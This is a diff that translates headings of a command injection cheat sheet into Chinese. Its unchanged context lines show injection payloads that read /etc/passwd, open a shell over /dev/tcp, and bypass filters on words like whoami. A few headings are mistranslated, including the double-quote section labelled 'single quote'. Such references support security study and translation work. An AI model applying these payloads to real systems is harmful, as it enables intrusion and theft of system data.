@@ -1,6 +1,6 @@
-# Command Injection
+# 命令注入
 
-> Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
+> 命令注入是安全漏洞中的一种，它使攻击者可以在有漏洞的应用程序中执行任意命令。
 
 ## Summary
 
@@ -9,16 +9,16 @@
   * [Basic commands](#basic-commands)
   * [Chaining commands](#chaining-commands)
   * [Inside a command](#inside-a-command)
-* [Filter Bypasses](#filter-bypasses)
-  * [Bypass without space](#bypass-without-space)
-  * [Bypass with a line return](#bypass-with-a-line-return)
+* [过滤绕过](#过滤绕过)
+  * [不带空格](不带空格)
+  * [使用换行符](#使用换行符)
   * [Bypass blacklisted words](#bypass-blacklisted-words)
-   * [Bypass with single quote](#bypass-with-single-quote)
-   * [Bypass with double quote](#bypass-with-double-quote)
-   * [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
-   * [Bypass with $@](#bypass-with-)
-   * [Bypass with variable expansion](#bypass-with-variable-expansion)
-   * [Bypass with wildcards](#bypass-with-wildcards)
+   * [使用单引号](#使用单引号)
+   * [使用双引号](#使用双引号)
+   * [使用斜杠和反斜杠](#使用斜杠和反斜杠)
+   * [使用 $@](#使用 $@)
+   * [使用变量表达式](#使用变量表达式)
+   * [使用通配符](#使用通配符)
 * [Challenge](#challenge)
 * [Time based data exfiltration](#time-based-data-exfiltration)
 * [DNS based data exfiltration](#dns-based-data-exfiltration)
@@ -60,9 +60,9 @@ original_cmd_by_server `cat /etc/passwd`
 original_cmd_by_server $(cat /etc/passwd)
 ```
 
-## Filter Bypasses
+## 过滤绕过
 
-### Bypass without space
+### 不带空格
 
 Works on Linux only.
 
@@ -89,7 +89,7 @@ Linux crashlab 4.4.X-XX-generic #72-Ubuntu
 swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
 ```
 
-Commands execution without spaces, $ or { } - Linux (Bash only)
+不带空格，$或{}的命令执行-Linux（仅限Bash）
 
 ```powershell
 IFS=,;`cat<<<uname,-a`
@@ -102,7 +102,7 @@ ping%CommonProgramFiles:~10,-18%IP
 ping%PROGRAMFILES:~10,-5%IP
 ```
 
-### Bypass with a line return
+### 使用换行符
 
 ```powershell
 something%0Acat%20/etc/passwd
@@ -110,26 +110,26 @@ something%0Acat%20/etc/passwd
 
 ### Bypass Blacklisted words
 
-#### Bypass with single quote
+#### 使用单引号
 
 ```powershell
 w'h'o'am'i
 ```
 
-#### Bypass with double quote
+#### 使用单引号
 
 ```powershell
 w"h"o"am"i
 ```
 
-#### Bypass with backslash and slash
+#### 使用斜杠和反斜杠
 
 ```powershell
 w\ho\am\i
 /\b\i\n/////s\h
 ```
 
-#### Bypass with $@
+#### 使用 $@
 
 ```powershell
 who$@ami
@@ -139,7 +139,7 @@ echo $0
 echo whoami|$0
 ```
 
-#### Bypass with variable expansion
+#### 使用比变量表达式
 
 ```powershell
 /???/??t /???/p??s??
@@ -149,7 +149,7 @@ cat ${test//hhh\/hm/}
 cat ${test//hh??hm/}
 ```
 
-#### Bypass with wildcards
+#### 使用通配符
 
 ```powershell
 powershell C:\*\*2\n??e*d.*? # notepad
